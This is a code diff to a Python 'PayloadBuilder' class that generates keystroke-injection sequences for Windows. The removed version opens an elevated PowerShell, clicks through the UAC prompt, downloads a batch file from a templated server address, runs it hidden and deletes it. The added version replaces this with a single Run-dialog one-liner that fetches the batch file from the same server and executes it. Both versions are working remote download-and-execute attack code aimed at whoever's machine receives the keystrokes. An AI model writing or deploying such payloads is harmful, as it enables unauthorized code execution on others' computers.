@@ -33,13 +33,8 @@ class PayloadBuilder:
     def _get_bat_payload_commands(self, bat_filename):
         return [
             {'action': 'combo', 'keys': ['WIN', 'r']},
-            {'action': 'delay', 'ms': 500},
-            {'action': 'type', 'text': 'powershell'},
-            {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-            {'action': 'delay', 'ms': 6000},
-            {'action': 'combo', 'keys': ['ALT', 'y']},
-            {'action': 'delay', 'ms': 7000},
-            {'action': 'type', 'text': f'Invoke-WebRequest -Uri "http://{{{{SERVER_IP}}}}/payloads/{bat_filename}" -OutFile "$env:TEMP\\p.bat" -UseBasicParsing; Start-Process -Wait -WindowStyle Hidden -FilePath "$env:TEMP\\p.bat"; rm "$env:TEMP\\p.bat"; exit'},
+            {'action': 'delay', 'ms': 600},
+            {'action': 'type', 'text': f'powershell -c "iwr http://{{{{SERVER_IP}}}}/payloads/{bat_filename} -o $env:TEMP\\p.bat; cmd /c $env:TEMP\\p.bat"'},
             {'action': 'key', 'name': 'ENTER'},
         ]
 
